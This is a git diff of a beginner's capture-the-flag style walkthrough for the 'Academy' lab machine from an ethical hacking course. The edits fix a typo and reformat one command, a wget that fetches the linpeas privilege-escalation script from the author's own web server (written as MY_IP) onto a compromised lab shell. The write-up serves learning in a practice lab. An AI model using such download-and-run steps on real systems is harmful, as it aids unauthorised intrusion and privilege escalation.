@@ -1,6 +1,6 @@
 # ACADEMY
 
-It was gottem as I was studying the practical ethical hacking course on TCM ACADEMY. This writeup will be a walkthrough on it. I ran it on a virtual machine to get the IP of the machie.
+It was gotten as I was studying the practical ethical hacking course on TCM ACADEMY. This writeup will be a walkthrough on it. I ran it on a virtual machine to get the IP of the machie.
 
 Advice to beginners just like me, I won't advise you follow this walkthrough back to back as it will not really help you progress well in your journey. You can just come here to check when you get stuck and have tried all possible things you know before.
 
@@ -42,7 +42,7 @@ After getting in, the only interesting thing here was that there was a place to 
 
 ![image](https://github.com/Bangis041/academy-/assets/74382096/2437bec1-dff5-49ae-9557-dd9d001422cb)
 
-i copied and pasted in a .sh file i named linpeas. Now i have to transfer the file to the shell by hosting a webserver ad using wget. I used <wget http://MY_IP/file>
+i copied and pasted in a .sh file i named linpeas. Now i have to transfer the file to the shell by hosting a webserver ad using wget. I used ```wget http://MY_IP/file```
 
 ![image](https://github.com/Bangis041/academy-/assets/74382096/040247fa-141e-4d1f-ab19-828aaee7d1f8). 
 
